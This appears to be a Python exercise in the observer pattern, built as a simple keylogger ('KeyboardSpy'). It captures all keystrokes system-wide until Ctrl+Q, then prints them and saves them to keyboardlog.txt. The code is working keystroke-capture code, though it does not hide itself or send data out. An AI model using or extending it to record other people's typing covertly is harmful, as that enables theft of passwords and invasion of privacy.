import keyboard
from abc import ABCMeta, abstractmethod

class Observer(metaclass=ABCMeta):
    @abstractmethod
    def get(self, line: str):
        pass

class KeyboardSpy:

    def __init__(self):
        self.observers = []
        self.line = ''
        pass

    def add_observer(self, observer: Observer):
        self.observers.append(observer)
    def send(self):
        for observer in self.observers:
            observer.get(self.line)
    def main(self):
        while True:
            try:
                key = keyboard.read_key()
                self.line += ' ' + key
                if keyboard.is_pressed("ctrl") and key == "q":
                    self.send()
                    break
            except:
                break

class KeyLogger(Observer):
    def get(self, line: str):
        print(line)


class KeyFileLogger(Observer):
    def get(self, line: str):
        with open('keyboardlog.txt', 'w') as f:
            f.write(line)

if __name__ == '__main__':
    keyboardSpy = KeyboardSpy()
    keyLogger = KeyLogger()
    keyboardSpy.add_observer(keyLogger)
    keyFileLogger = KeyFileLogger()
    keyboardSpy.add_observer(keyFileLogger)
    keyboardSpy.main()
